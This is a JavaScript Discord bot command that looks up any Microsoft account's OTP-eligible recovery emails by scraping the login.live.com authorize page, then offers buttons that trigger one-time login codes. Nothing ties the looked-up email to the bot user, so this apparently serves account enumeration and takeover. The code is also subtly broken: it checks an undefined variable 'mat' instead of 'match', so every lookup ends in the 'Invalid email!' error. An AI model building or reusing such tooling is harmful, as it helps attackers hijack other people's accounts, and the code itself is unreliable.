const { ApplicationCommandOptionType, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const axios = require("axios")
const generate = require("../../utils/generate");
const { queryParams } = require("../../../db/db");
module.exports = {
  name: "requestotp",
  description: "Request OTP from your email",
  enabled: true,
  options: [
    {
      name: "email",
      description: "Email to send OTP to",
      type: ApplicationCommandOptionType.String,
      required: true,
    },
  ],
  userOnly: true,
  callback: async (client, interaction) => {
    let email = interaction.options.getString("email");
    const { data } = await axios({
      method: "GET",
      url: `https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&scope=openid&redirect_uri=https://www.office.com/landingv2&response_type=code&msproxy=1&username=${email}`,
    })
    try {
      const match = data.match(/({\"Username\":.*?\}\})/);
      let profiles;
      if (mat && mat[0]) {
        try {
          profiles = JSON.parse(mat[0].replace("}},", "}}"));
        } catch (e) {
          console.log("⚠️ Failed to parse profiles JSON:", e.message);
          return interaction.reply({ content: `❌ Failed to parse data from Microsoft.`, ephemeral: true });
        }
      } else {
        console.log("⚠️ Could not find match in response:", data.slice(0, 500)); // log HTML
        return interaction.reply({ content: `❌ This email may not exist or not eligible for OTP login.`, ephemeral: true });
      }


      if (!profiles?.Credentials?.OtcLoginEligibleProofs) {
        return interaction.reply({ content: `No Security Emails in that email!`, ephemeral: true })
      }
      let buttons = [new ActionRowBuilder()]
      let i = 1
      for (let sec of profiles?.Credentials?.OtcLoginEligibleProofs) {
        if (i % 5 == 0) {
          let id = generate(32)
          await queryParams(`INSERT INTO actions(id,action) VALUES(?,?)`, [id, `sendcode|${sec.data}`])
          buttons.push(new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId("action|" + id).setEmoji("📧").setLabel(sec.display).setStyle(ButtonStyle.Primary)))
        } else {
          let id = generate(32)
          await queryParams(`INSERT INTO actions(id,action) VALUES(?,?)`, [id, `sendcode|${sec.data}`])
          buttons[buttons.length - 1].addComponents(new ButtonBuilder().setCustomId("action|" + id).setEmoji("📧").setLabel(sec.display).setStyle(ButtonStyle.Primary))
        }
        i++
      }
      return interaction.reply({
        embeds: [{
          title: `${email}`,
          description: `Which security email should I send to?`,
          color: 0x13def3
        }],
        components: buttons,
        ephemeral: true
      })
    } catch (e) {
      return interaction.reply({ content: `Invalid email!`, ephemeral: true })
    }
  },
};
